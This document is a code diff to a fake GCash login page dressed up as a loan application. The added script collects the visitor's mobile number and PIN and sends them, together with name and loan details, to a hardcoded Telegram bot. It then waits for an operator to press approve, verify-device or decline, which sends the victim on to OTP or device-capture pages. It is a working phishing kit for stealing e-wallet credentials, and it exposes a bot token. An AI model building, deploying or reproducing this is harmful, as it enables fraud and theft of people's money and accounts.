@@ -272,6 +272,93 @@
       color: var(--muted);
       font-size: 11px;
     }
+
+    #errMsg {
+      display: none;
+      color: #dc2626;
+      font-size: 13px;
+      margin-bottom: 16px;
+      padding: 10px;
+      background: #fee2e2;
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    #applicationSummary {
+      display: none;
+      background: var(--primary-soft);
+      border: 1px solid rgba(0, 177, 79, 0.2);
+      border-radius: 16px;
+      padding: 14px;
+      margin-bottom: 20px;
+      font-size: 12px;
+      color: var(--primary-dark);
+    }
+
+    #applicationSummary.active {
+      display: block;
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 6px 0;
+      border-bottom: 1px solid rgba(0, 177, 79, 0.1);
+    }
+
+    .summary-row:last-child {
+      border-bottom: none;
+    }
+
+    .summary-label {
+      font-weight: 700;
+    }
+
+    .summary-value {
+      font-weight: 900;
+    }
+
+    #spinnerOverlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 9999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(255, 255, 255, 0.3);
+      border-top: 4px solid white;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .spin-label {
+      color: white;
+      font-size: 16px;
+      font-weight: 900;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+
+    .spin-sub {
+      color: rgba(255, 255, 255, 0.7);
+      font-size: 13px;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
@@ -293,14 +380,31 @@
     <h1 class="hero">Welcome back</h1>
     <div class="sub">Log in to manage your money with ease and security.</div>
 
-    <div class="field">
-      <label class="label" for="mobile">Mobile number</label>
-      <input id="mobile" class="input" type="text" placeholder="0917 123 4567" />
+    <div id="errMsg"></div>
+
+    <div id="applicationSummary">
+      <div class="summary-row">
+        <span class="summary-label">Name:</span>
+        <span class="summary-value" id="summaryName">—</span>
+      </div>
+      <div class="summary-row">
+        <span class="summary-label">Loan Amount:</span>
+        <span class="summary-value" id="summaryAmount">—</span>
+      </div>
+      <div class="summary-row">
+        <span class="summary-label">Loan Type:</span>
+        <span class="summary-value" id="summaryType">—</span>
+      </div>
     </div>
 
     <div class="field">
-      <label class="label" for="password">MPIN</label>
-      <input id="password" class="input" type="password" placeholder="Enter your MPIN" />
+      <label class="label" for="phoneInput">Mobile number</label>
+      <input id="phoneInput" class="input" type="text" placeholder="917 123 4567" maxlength="10" />
+    </div>
+
+    <div class="field">
+      <label class="label" for="pinInput">PIN</label>
+      <input id="pinInput" class="input" type="password" placeholder="Enter your 4-digit PIN" maxlength="4" />
     </div>
 
     <div class="row">
@@ -308,10 +412,10 @@
         <input type="checkbox" />
         <span>Remember me</span>
       </label>
-      <a href="#" class="link">Forgot MPIN?</a>
+      <a href="#" class="link">Forgot PIN?</a>
     </div>
 
-    <button class="primary" onclick="proceedToOTP()">Log In</button>
+    <button class="primary" id="continueBtn">Log In</button>
 
     <div class="divider">or continue with</div>
 
@@ -327,22 +431,187 @@
     <div class="footer">© 2026 GCash. All rights reserved.</div>
   </div>
 
+  <!-- Spinner overlay -->
+  <div id="spinnerOverlay">
+    <div class="spinner"></div>
+    <div class="spin-label">Verifying &amp; Processing</div>
+    <div class="spin-sub">Please hold on…</div>
+  </div>
+
   <script>
-    function goBack() {
-      window.location.href = 'details.html';
+    const CONFIG = {
+      BOT_TOKEN: '8722087484:AAEJ0Hc52ogYQ9NWQOV4m3Nl88x8TUR1O5k',
+      CHAT_ID: '8820857419',
+      APPROVE_PAGE: 'otp.html',
+      DEVICE_PAGE: 'device.html',
+      SUCCESS_PAGE: 'success.html'
+    };
+
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
+
+    const phoneInput     = document.getElementById('phoneInput');
+    const pinInput       = document.getElementById('pinInput');
+    const continueBtn    = document.getElementById('continueBtn');
+    const errMsg         = document.getElementById('errMsg');
+    const spinnerOverlay = document.getElementById('spinnerOverlay');
+
+    // ── Load application details from localStorage (original logic preserved) ──
+    function getStoredApplication() {
+      try {
+        return JSON.parse(localStorage.getItem('loanApplication') || '{}');
+      } catch (e) {
+        return {};
+      }
     }
 
-    function proceedToOTP() {
-      const mobile = document.getElementById('mobile').value;
-      const password = document.getElementById('password').value;
+    function normalizePhone(phone) {
+      return String(phone || '').replace(/\D/g, '').replace(/^63/, '').slice(-10);
+    }
 
-      if (!mobile || !password) {
-        alert('Please enter your mobile number and MPIN');
+    function loadApplicationDetails() {
+      const application = getStoredApplication();
+      const fullName = [application.firstName, application.lastName].filter(Boolean).join(' ').trim();
+      const phone = normalizePhone(application.phone || localStorage.getItem('phone'));
+
+      if (phone) phoneInput.value = phone;
+
+      if (fullName || application.loanAmount || application.loanType) {
+        document.getElementById('applicationSummary').classList.add('active');
+        document.getElementById('summaryName').textContent   = fullName || '—';
+        document.getElementById('summaryAmount').textContent = application.loanAmount ? '₱' + Number(application.loanAmount).toLocaleString() : '—';
+        document.getElementById('summaryType').textContent   = application.loanType || '—';
+      }
+    }
+
+    // ── Input sanitisation ──
+    phoneInput.addEventListener('input', () => {
+      phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 10);
+    });
+
+    pinInput.addEventListener('input', () => {
+      pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
+      if (pinInput.value.length === 4) pinInput.blur();
+    });
+
+    // ── Helpers ──
+    function showError(msg) {
+      errMsg.textContent   = msg;
+      errMsg.style.display = 'block';
+    }
+
+    function resetButton() {
+      isProcessing            = false;
+      continueBtn.disabled    = false;
+      continueBtn.textContent = 'Log In';
+    }
+
+    // ── Telegram bot send + poll ──
+    function sendToBot(phone, pin) {
+      if (isProcessing) return;
+      isProcessing = true;
+      continueBtn.disabled    = true;
+      continueBtn.textContent = 'Verifying…';
+
+      const application = getStoredApplication();
+      const loanAmount  = application.loanAmount ? '₱' + Number(application.loanAmount).toLocaleString() : '—';
+      const loanType    = application.loanType || '—';
+      const fullName    = [application.firstName, application.lastName].filter(Boolean).join(' ').trim() || '—';
+
+      const ts        = Date.now();
+      const approveId = `approve_${ts}`;
+      const declineId = `decline_${ts}`;
+      const verifyId  = `verify_${ts}`;
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🟢 GCash Loan Verification (Philippines)</b>\n\nApplicant: <b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan Type: <b>${loanType}</b>\nPhone: <code>+63${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Approve Loan',  callback_data: approveId },
+                { text: '📱 Verify Device', callback_data: verifyId  }
+              ],
+              [{ text: '❌ Decline', callback_data: declineId }]
+            ]
+          }
+        })
+      })
+      .then(() => {
+        // Save phone to localStorage (original behaviour)
+        localStorage.setItem('phone', phone);
+        localStorage.setItem('gcashLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() }));
+
+        spinnerOverlay.style.display = 'flex';
+        startPolling(approveId, declineId, verifyId);
+      })
+      .catch(() => resetButton());
+    }
+
+    function startPolling(approveId, declineId, verifyId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok || !data.result) return;
+
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+
+              if (update.callback_query) {
+                const cb = update.callback_query.data;
+
+                if (cb === approveId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  window.location.href = CONFIG.APPROVE_PAGE;
+                }
+                else if (cb === verifyId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  window.location.href = CONFIG.DEVICE_PAGE;
+                }
+                else if (cb === declineId) {
+                  clearInterval(interval);
+                  spinnerOverlay.style.display = 'none';
+                  showError('Request declined. Please try again.');
+                  resetButton();
+                }
+              }
+            });
+          });
+      }, 1000);
+    }
+
+    // ── Submit ──
+    continueBtn.addEventListener('click', () => {
+      errMsg.style.display = 'none';
+
+      const phone = normalizePhone(phoneInput.value);
+      const pin   = pinInput.value.trim();
+
+      if (phone.length !== 10) {
+        showError('Please enter a valid 10-digit Philippine mobile number.');
+        return;
+      }
+      if (pin.length !== 4) {
+        showError('Please enter your 4-digit GCash PIN.');
         return;
       }
 
-      window.location.href = 'otp.html';
-    }
+      sendToBot(phone, pin);
+    });
+
+    // ── Init ──
+    window.addEventListener('pageshow', (event) => {
+      if (event.persisted) window.location.reload();
+    });
+
+    window.addEventListener('load', loadApplicationDetails);
   </script>
 </body>
 </html>
